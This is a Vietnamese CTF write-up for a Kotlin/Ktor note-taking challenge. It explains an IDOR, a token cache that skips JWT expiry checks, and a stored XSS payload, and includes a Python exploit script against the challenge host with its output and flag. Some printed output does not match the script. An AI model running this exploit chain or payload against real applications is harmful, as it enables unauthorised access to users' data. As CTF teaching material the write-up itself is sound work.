@@ -1,0 +1,133 @@
+CTF WRITEUP
+SecureNotes — Web Exploitation
+IDOR + JWT Token Cache Bypass
+
+1. Tổng Quan Challenge
+SecureNotes là một ứng dụng ghi chú (note-taking app) viết bằng Kotlin/Ktor. Người dùng có thể đăng ký, đăng nhập, tạo và xóa ghi chú của mình. Ngoài ra còn có tính năng xuất ghi chú (Export Notes).
+
+Mục tiêu: Đọc được ghi chú của user owner để lấy flag.
+
+Flag nằm trong Database.kt:
+val flag = File("/flag.txt").readText()
+Notes.insert {
+    it[content] = "Something something $flag"  // note của owner
+}
+
+2. Phân Tích Source Code
+2.1 Cấu trúc Source Code
+Application.kt — routing chính, xử lý các endpoint
+Database.kt — khởi tạo DB, tạo user owner với flag
+JwtConfig.kt — generate/verify JWT token
+TokenCache.kt — cache token in-memory
+NotesViews.kt — render HTML (Stored XSS ở đây)
+AuthViews.kt — login/register pages
+
+2.2 Lỗ Hổng 1: IDOR tại /notes/request-download
+Endpoint này nhận username từ POST body nhưng KHÔNG kiểm tra xem username đó có phải là user đang đăng nhập hay không:
+
+val requestedUsername = params["username"] ?: ""
+// KHÔNG check requestedUsername == logged-in user!
+val user = UserService.getUserByUsername(requestedUsername)
+val notes = NoteService.getUserNotes(user.id)  // lấy notes của BẤT KỲ user
+
+Attacker có thể truyền username=owner để lấy notes của owner chứa flag.
+
+2.3 Lỗ Hổng 2: JWT Token chỉ sống 3 phút nhưng timer cần 5 phút
+private const val validityInMs = 3 * 60_000  // JWT expire sau 3 phút
+val grantedTime = System.currentTimeMillis() + (300 * 1000)  // timer 5 phút
+
+Tưởng chừng không thể exploit được vì token hết hạn trước khi download timer kết thúc.
+
+2.4 Lỗ Hổng 3: TokenCache không check expiration
+fun verifyToken(token: String): Claims? {
+    return cache[token]  // chỉ check cache, KHÔNG check JWT expiration!
+}
+
+Token chỉ bị xóa khỏi cache bởi cleanup loop, chạy mỗi 5 giây. Điều này có nghĩa là nếu giữ được session sống (bằng cách poll liên tục), server vẫn accept token cho đến khi cleanup loop chạy.
+
+2.5 Lỗ Hổng 4: Stored XSS (Bonus)
+// NotesViews.kt
+unsafe { +note.content }  // render HTML không escape!
+
+Note content được render thẳng ra HTML mà không escape, cho phép Stored XSS. Cookie SESSION không có HttpOnly flag nên có thể đọc bằng document.cookie.
+
+3. Quá Trình Tìm Ra Exploit
+3.1 Phát hiện ban đầu
+Đầu tiên phát hiện IDOR rõ ràng ở /notes/request-download — form gửi username của chính người dùng nhưng server không verify. Thử truyền username=owner ngay lập tức.
+
+3.2 Vấn đề gặp phải
+Token JWT expire sau 3 phút, trong khi download timer cần 5 phút. Mỗi lần login lại tạo token mới với downloadPermissions key mới — phải đặt timer lại từ đầu.
+
+3.3 Key Insight
+Nhận ra rằng TokenCache.verifyToken() chỉ check cache (không check JWT expiration). Nếu liên tục gửi request đến server trong khi chờ timer, session vẫn được coi là hợp lệ vì token vẫn còn trong cache.
+
+Cleanup loop chạy mỗi 5 giây và chỉ xóa token khi không có request nào giữ nó alive. Bằng cách poll mỗi 10 giây, token luôn được "refresh" trong cache.
+
+3.4 Xác nhận XSS
+Tạo note với payload <img src=x onerror="alert(1)"> — XSS hoạt động. Confirm cookie không có HttpOnly. Tuy nhiên không cần dùng XSS cho exploit chính vì không có admin bot.
+
+4. Chuỗi Exploit
+Đăng ký tài khoản mới bất kỳ
+Đăng nhập để nhận JWT token (sống 3 phút)
+POST /notes/request-download với username=owner để đặt timer 5 phút
+Poll liên tục mỗi 10 giây để giữ session sống trong cache
+Sau 300 giây (5 phút), server trả về notes của owner chứa flag
+
+5. Exploit Script (Python)
+Script tự động hóa toàn bộ quá trình:
+
+import requests
+import time
+import random, string
+
+BASE_URL = "http://34.126.223.46:16986"
+
+def random_username():
+    return ''.join(random.choices(string.ascii_lowercase, k=10))
+
+def register_and_get_session(username, password="password123"):
+    s = requests.Session()
+    s.post(f"{BASE_URL}/register", data={"username": username, "password": password})
+    s.post(f"{BASE_URL}/login", data={"username": username, "password": password})
+    return s
+
+def set_timer(session):
+    r = session.post(f"{BASE_URL}/notes/request-download", data={"username": "owner"})
+    return r.text
+
+def try_download(session):
+    r = session.post(f"{BASE_URL}/notes/request-download", data={"username": "owner"})
+    return r.status_code, r.text
+
+username = random_username()
+session = register_and_get_session(username)
+set_timer(session)
+
+start = time.time()
+while True:
+    elapsed = int(time.time() - start)
+    status, text = try_download(session)
+    print(f"[{elapsed}s] status={status} | {text[:80]}")
+    if "processing" not in text and status == 200:
+        print(f"[+] FLAG FOUND:\n{text}")
+        break
+    time.sleep(10)
+
+6. Output
+[*] Registering user: mdzqkrhkmp
+[*] Logged in!
+[*] Setting download timer...
+[0s]   status=200 | Your request for data download is being processed...
+[10s]  status=200 | Your request for data download is being processed...
+...
+[308s] status=200 | - Something something kashiCTF{67358e160ab0c131916f0c05aebf8aff_scHgG4N370}}
+
+[+] FLAG FOUND:
+kashiCTF{67358e160ab0c131916f0c05aebf8aff_scHgG4N370}
+
+7. Tổng Kết Lỗ Hổng
+
+
+Root Cause
+IDOR kết hợp với TokenCache không check JWT expiration — cho phép giữ session sống đủ 5 phút để vượt qua download timer và đọc notes của owner chứa flag.
+
